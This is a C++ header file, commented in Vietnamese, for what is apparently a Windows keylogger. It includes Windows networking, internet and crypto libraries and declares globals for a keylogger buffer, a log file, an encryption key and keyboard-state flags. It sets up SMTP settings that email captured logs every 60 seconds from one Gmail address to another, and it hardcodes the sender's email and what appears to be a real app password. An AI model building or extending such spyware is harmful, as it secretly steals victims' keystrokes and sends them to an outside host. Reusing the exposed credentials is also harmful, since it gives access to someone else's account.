#pragma once

// Định nghĩa Windows API
#define _WIN32_WINNT 0x0600
#define WIN32_LEAN_AND_MEAN

// Standard libraries
#include <string>
#include <vector>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <random>
#include <ctime>
#include <csignal>
#include <iomanip>

// Windows API
#include <winsock2.h>  // Phải đứng trước windows.h
#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <winternl.h>
#include <shellapi.h> 

// Link libraries
#pragma comment(lib, "user32")
#pragma comment(lib, "advapi32")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

// Các tham số cấu hình
const std::string SMTP_SERVER = "smtp.gmail.com";
const int SMTP_PORT = 587;
const std::string SENDER_EMAIL = "ryzamdatwork@gmail.com";
const std::string SENDER_PASSWORD = "vxvkugnemkhyxfgh";
const std::string RECEIVER_EMAIL = "ryzamd0306@gmail.com";
const int SEND_INTERVAL = 60;

// Biến toàn cục
extern std::string encryptionKey;
extern std::string keylogger;
extern std::string logFile;
extern bool capital, numLock, shift;
extern DWORD tid;

// NT API types (để tránh xung đột với winternl.h)
#ifndef NT_API_DEFINED
#define NT_API_DEFINED
typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
    );
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif